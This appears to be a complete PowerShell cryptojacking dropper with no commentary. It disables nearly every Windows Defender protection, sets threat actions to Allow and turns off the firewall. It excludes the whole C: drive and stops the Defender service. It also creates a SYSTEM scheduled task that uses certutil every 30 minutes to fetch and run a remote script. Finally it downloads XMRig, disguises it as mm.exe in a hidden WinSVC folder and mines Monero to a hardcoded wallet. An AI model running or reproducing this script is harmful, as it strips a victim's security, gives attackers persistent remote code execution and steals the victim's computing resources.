# Disable various Windows Defender features
Set-MpPreference -DisableBehaviorMonitoring $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableDatagramProcessing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableDnsOverTcpParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableDnsParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableEmailScanning $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableFtpParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableGradualRelease $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableHttpParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableInboundConnectionFiltering $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableNetworkProtectionPerfTelemetry $True -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableRdpParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableRestorePoint $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableSshParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableTDTFeature $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableTlsParsing $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $True -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $True -ErrorAction SilentlyContinue

# Set threat actions to Allow
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue

# Disable firewall
netsh advfirewall set all state off

# Stop and disable Windows Defender service
sc stop WinDefend
sc config WinDefend start= disabled

# Create directories
New-Item -ItemType Directory -Force -Path C:\windows\system32\MDSN
New-Item -ItemType Directory -Force -Path C:\ProgramData\MDSN

# Set PUA protection
Set-MpPreference -PUAProtection 0

# Add exclusion paths
Add-MpPreference -ExclusionPath 'C:\'
Add-MpPreference -ExclusionPath 'C:\ProgramData'
Add-MpPreference -ExclusionPath 'C:\windows\system32\MDSN'
Set-MpPreference -ExclusionProcess 'explorer.exe', 'cmd.exe', 'mm.exe', 'powershell.exe', 'svchost.exe', 'scvhost.exe'

# Disable anti-spyware
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# Schedule task if not exists
if (-not (schtasks /query /TN "mmWin" > $null 2>&1)) {
    schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f https://raw.githubusercontent.com/cyberre124/test/main/atmon.ps1 $env:SystemDrive\Windows\Temp\atmon.ps1 & $env:SystemDrive\Windows\Temp\atmon.ps1"
}

# Check and download xmrig if not exists
if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC") {
    if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe") {
        Write-Output "Yes"
    } else {
        Remove-Item -Recurse -Force "$env:SystemDrive\Windows\Temp\WinSVC"
        Remove-Item -Recurse -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2"
    }
} else {
    Write-Output "No"
    [Net.ServicePointManager]::SecurityProtocol = 'Tls, Tls11, Tls12, Ssl3'
    Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip' -OutFile "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"
    Expand-Archive -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip" "$env:SystemDrive\Windows\Temp"
    Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" "$env:SystemDrive\Windows\Temp\WinSVC"
    Rename-Item "$env:SystemDrive\Windows\Temp\WinSVC\xmrig.exe" "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe"

    if (Test-Path "$env:SystemDrive\Windows\Temp\WinSVC") {
        Write-Output "Yes"
    } else {
        [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
        $pathToZip = "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"
        $targetDir = "$env:SystemDrive\Windows\Temp"
        [System.IO.Compression.ZipFile]::ExtractToDirectory($pathToZip, $targetDir)
        Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" "$env:SystemDrive\Windows\Temp\WinSVC"
        Rename-Item "$env:SystemDrive\Windows\Temp\WinSVC\xmrig.exe" "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe"
    }

    Get-Item "$env:SystemDrive\Windows\Temp\WinSVC" -Force | ForEach-Object { $_.Attributes = $_.Attributes -bor 'Hidden' }
}

# Get hostname
$host = (hostname)
Write-Output $host

# Get physical memory
$mem = [math]::round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum / 1GB)
Write-Output $mem

# Get number of logical processors
$cpu = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
Write-Output $cpu

# Set name and start mm.exe if not running
$name = "$host.$mem`GB.$cpu`CPU"
Write-Output $name

$EXE = "mm.exe"
$process = Get-Process -Name $EXE -ErrorAction SilentlyContinue
if (-not $process) {
    Write-Output "$EXE is Not Running"
    Start-Process -FilePath "$env:SystemDrive\Windows\Temp\WinSVC\mm.exe" -ArgumentList "-o xmrpool.eu:9999 -u 41zgTNW4Z9FiTorttLakhJ8HFN77CXeFw1NNMHa48oqPZZFwrEc6JNj3bDaihgdzmuXDcKZeJhRfBAEAcSeT41hs9cvCMNR -k --tls --rig-id $name --randomx-1gb-pages --background"
}

